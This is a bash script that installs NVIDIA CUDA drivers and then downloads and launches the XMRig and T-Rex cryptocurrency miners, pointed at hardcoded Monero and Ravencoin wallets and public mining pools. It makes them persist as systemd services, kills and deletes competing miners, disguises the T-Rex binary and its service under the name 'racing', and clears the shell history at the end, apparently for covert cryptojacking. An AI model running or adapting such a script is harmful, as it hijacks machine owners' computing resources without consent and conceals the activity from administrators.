cd /home
myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H_Test')
noCore=$(nproc --all)
usingcore=$((noCore*80/100))
if [[ $noCore -eq 6 ]]
then
    sudo apt-get install linux-headers-$(uname -r) -y
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
    sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
    sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
    sudo apt-key del 7fa2af80
    sudo rm /etc/apt/sources.list.d/cuda.list
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
    sudo dpkg -i cuda-keyring_1.0-1_all.deb
    sudo apt-get update
    sudo apt-get -y install cuda-drivers
    sudo apt-get install libcurl4 -y
    sudo apt-get install cuda-drivers-515 -y
    sudo apt-get install cuda-drivers-fabricmanager-515 -y
    sudo systemctl enable nvidia-fabricmanager
    sudo systemctl start nvidia-fabricmanager
    sudo nvidia-smi mig -cgi 0 -C

    sudo killall SRBMiner-MULTI
    sudo rm -rf  SRBMiner-Multi-1-1-1
    sudo killall xmrig
    sudo rm -rf xmrig-6.18.1
    sudo rm -rf xmrig-6.16.2
    sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
    sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT."'${myworker}_C_${noCore}'" --randomx-no-rdmsr --threads="'${usingcore}'" --cpu-max-threads-hint=75 --coin monero --rig-id myworker\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
    sudo systemctl daemon-reload
    sudo systemctl enable xmrig.service
    sudo nohup ./xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT.${myworker}_C_${noCore} --randomx-no-rdmsr --threads=${usingcore} --cpu-max-threads-hint=75 --coin monero --rig-id myworker &
    
    
    sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
    sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
    sudo mv t-rex racing
    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_ST_C_M_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
    sudo systemctl daemon-reload
    sudo systemctl enable racing.service
    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_ST_C_M_${noCore} -p x &
    
    history -c
else
    sudo killall SRBMiner-MULTI
    sudo rm -rf  SRBMiner-Multi-1-1-1
    sudo killall xmrig
    sudo rm -rf xmrig-6.18.1
    sudo rm -rf xmrig-6.16.2
    sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
    sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT."'${myworker}_C_${noCore}'" --randomx-no-rdmsr --threads="'${usingcore}'" --cpu-max-threads-hint=75 --coin monero --rig-id myworker\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
    sudo systemctl daemon-reload
    sudo systemctl enable xmrig.service
    sudo nohup ./xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT.${myworker}_C_${noCore} --randomx-no-rdmsr --threads=${usingcore} --cpu-max-threads-hint=75 --coin monero --rig-id myworker &
    history -c
fi
